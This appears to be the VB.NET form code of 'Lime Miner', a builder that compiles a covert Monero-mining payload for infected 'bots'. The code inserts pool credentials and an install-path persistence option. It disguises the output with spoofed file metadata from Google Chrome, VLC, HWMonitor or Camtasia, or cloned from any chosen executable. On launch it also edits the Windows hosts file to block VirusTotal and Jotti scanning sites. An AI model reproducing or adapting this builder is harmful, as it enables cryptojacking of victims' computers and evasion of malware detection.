'------------------------------------------
'Lime Miner - a simple xmr miner builder | Nyan Cat 8/27/2018
' Updated Jun/5/2019
'
'github.com/NYAN-x-CAT
'------------------------------------------


Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography

Public Class Form1
    Public Shared rand As New Random()

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me
        HuraForm1.Text = "Lime Miner v0.3.2 @" + Environment.UserName

        BackgroundWorker1.RunWorkerAsync()
        GiveTip()

    End Sub

    Private Sub GiveTip()
        Try
            Select Case rand.Next(3)
                Case 0
                    HuraAlertBox1.Text = "[*] Auto optimal threads settings based by bot's CPU model"

                Case 1
                    HuraAlertBox1.Text = "[*] If there is no GPU, The miner will use CPU"

                Case 2
                    HuraAlertBox1.Text = "[*] Miner will use only 50% of CPU or GPU"
            End Select
            HuraAlertBox1.Visible = True
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork


        Try
            txtInstallPathMain.SelectedIndex = 0
            txtInjection.SelectedIndex = 0
        Catch ex As Exception
        End Try

        'In case user is an idiot (need run as, use manifest)
        Try
            Dim path As String = "C:\Windows\System32\Drivers\Etc\Hosts"
            If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then

                Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
                   Environment.NewLine + "127.0.0.1    https://virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    www.virusscan.jotti.org"

                IO.File.AppendAllText(path, appendText)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If txtPoolUsername.Text <> "..." AndAlso txtPoolURL.Text <> "..." Then
                Dim s As New SaveFileDialog
                s.Filter = "Executable |*.exe"
                s.InitialDirectory = Application.StartupPath
                If s.ShowDialog = DialogResult.OK Then
                    OutputPayload = s.FileName
                    BackgroundWorker2.RunWorkerAsync()
                    btnBuild.Enabled = False
                    btnBuild.Text = "Please wait"
                End If
            Else
                MsgBox("Enter a valid pool settings", MsgBoxStyle.Exclamation)
                HuraTabControl1.SelectedIndex = 0
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public OutputPayload
    Public Resources_dll = Randomi(rand.Next(5, 10))
    Public Resources_cpu = Randomi(rand.Next(5, 10))
    Public Resources_nvidia = Randomi(rand.Next(5, 10))
    Public Resources_nvidia9 = Randomi(rand.Next(5, 10))
    Public Resources_amd = Randomi(rand.Next(5, 10))
    Public Resources_Parent = Randomi(rand.Next(5, 10))
    Public AESKEY As String = Randomi(rand.Next(5, 10))

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim Source = My.Resources.Program
            txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
            Source = Replace(Source, "#dll", Resources_dll)
            Source = Replace(Source, "#cpu", Resources_cpu)
            Source = Replace(Source, "#nvidia", Resources_nvidia)
            Source = Replace(Source, "#nvidia9", Resources_nvidia9)
            Source = Replace(Source, "#amd", Resources_amd)
            Source = Replace(Source, "#ParentRes", Resources_Parent)
            Source = Replace(Source, "#USER", txtPoolUsername.Text)
            Source = Replace(Source, "#URL", txtPoolURL.Text)
            Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
            Source = Replace(Source, "#KEY", AESKEY)


            txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)

            If chkInstall.Checked = True Then
                Source = Replace(Source, "#Const INS = False", "#Const INS = True")
                Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
            End If


            If chkAssembly.Checked = True Then
                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
                Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")

                Source = Replace(Source, "%Title%", txtTitle.Text)
                Source = Replace(Source, "%Description%", txtDescription.Text)
                Source = Replace(Source, "%Company%", txtCompany.Text)
                Source = Replace(Source, "%Product%", txtProduct.Text)
                Source = Replace(Source, "%Copyright%", txtCopyright.Text)
                Source = Replace(Source, "%Trademark%", txtTrademark.Text)
                Source = Replace(Source, "%v1%", num_Assembly1.Text)
                Source = Replace(Source, "%v2%", num_Assembly2.Text)
                Source = Replace(Source, "%v3%", num_Assembly3.Text)
                Source = Replace(Source, "%v4%", num_Assembly4.Text)
                Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)

            End If

            If chkIcon.Checked Then
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
            Else
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
            End If

            If Codedom.OK = True Then

                txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True

                Try
                    IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                Catch ex As Exception
                End Try

                txtLog.Text = txtLog.Text.Insert(0, "GitHub.com/NYAN-x-CAT" + vbNewLine + vbNewLine)
                txtLog.Text = txtLog.Text.Insert(0, "~=[,,_,,]^‥^" + vbNewLine)

            Else
                txtLog.Text = txtLog.Text.Insert(0, "Error!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        If chkInstall.Checked = True Then
            chkInstall.Text = "Install ON"
            txtInstallPathMain.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Install OFF"
            txtInstallPathMain.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked = True Then
            chkAssembly.Text = "ON"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "OFF"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(6)
                Case 0
                    txtTitle.Text = "chrome_exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "67"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3396"
                    num_Assembly4.Text = "99"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = "HWMonitor.exe"
                    txtDescription.Text = "HWMonitor"
                    txtProduct.Text = "CPUID Hardware Monitor"
                    txtCompany.Text = "CPUID"
                    txtCopyright.Text = "(c)2008-2018 CPUID.  All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "1"
                    num_Assembly2.Text = "3"
                    num_Assembly3.Text = "4"
                    num_Assembly4.Text = "0"

                Case 4
                    txtTitle.Text = "CamtasiaStudio.exe"
                    txtDescription.Text = "TechSmith Camtasia 2018"
                    txtProduct.Text = "Camtasia"
                    txtCompany.Text = "TechSmith Corporation"
                    txtCopyright.Text = "Copyright © 2011-2018 TechSmith Corporation. All rights reserved."
                    txtTrademark.Text = "18"
                    num_Assembly1.Text = "0"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "31"
                    num_Assembly4.Text = "0"

                Case 5
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked = True Then
            chkIcon.Text = "ON"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "OFF"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub HuraTabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles HuraTabControl1.SelectedIndexChanged
        On Error Resume Next
        If Me.HuraTabControl1.SelectedIndex = 0 Then
            GiveTip()
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        GiveTip()
    End Sub
End Class
